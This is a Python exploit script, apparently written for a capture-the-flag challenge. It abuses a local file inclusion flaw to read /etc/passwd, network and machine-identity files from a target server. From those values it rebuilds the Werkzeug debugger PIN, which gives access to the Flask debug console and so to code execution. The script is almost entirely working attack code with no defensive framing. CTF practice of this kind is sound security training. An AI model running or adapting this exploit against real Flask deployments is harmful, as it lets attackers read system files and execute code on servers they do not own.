import hashlib
import typing as t
from itertools import chain
import requests

HOST = "http://hack.backdoor.infoseciitr.in:13456"

LFI_URL = HOST +  "/article"

def get_local_file(filepath: str):
    params = {"name" : filepath}
    response = requests.get(LFI_URL, params).text
    return response.split("I told you not to....anyways")[1].split("h2>")[1][:-2]


def get_username():
    passwd:str = get_local_file("/etc/passwd")
    username = passwd.splitlines()[-1].split(":")[0]
    print(f"Username: {username}")
    return username

def get_NIC():
    arp: str = get_local_file("/proc/net/arp")
    NIC = arp.splitlines()[1].split(" ")[-1]
    print(f"NIC: {NIC}")
    return NIC

def get_MAC():
    NIC = get_NIC()
    file = f"/sys/class/net/{NIC}/address"
    MAC = get_local_file(file)
    MAC = MAC.replace("\n", "")
    MAC = MAC.replace(" ", "")
    MAC = MAC.replace(" ", "")
    MAC_decimal = str(int(MAC.replace(":", ""), 16))
    MAC_decimal.strip()
    print(f"MAC: {MAC} (decimal: {MAC_decimal})")
    return MAC_decimal

def get_machine_id():
    # TODO: add check in /etc/machine-id too
    boot_id = get_local_file("/proc/sys/kernel/random/boot_id").strip()

    cgroup = get_local_file("/proc/self/cgroup").splitlines()[0]
    cgroup = cgroup.split("/")[-1]
    machine_id = boot_id + cgroup
    print(f"machine_id: {machine_id}")
    return machine_id

if __name__ == "__main__":

    username = get_username()
    MAC = get_MAC()
    machine_id = get_machine_id()
    # exit()


    probably_public_bits = [
        username,
        'flask.app',
        'Flask',
        '/usr/local/lib/python3.9/site-packages/flask/app.py'
    ]

    private_bits = [
        MAC,
        machine_id
        ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    num = None
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    print(rv)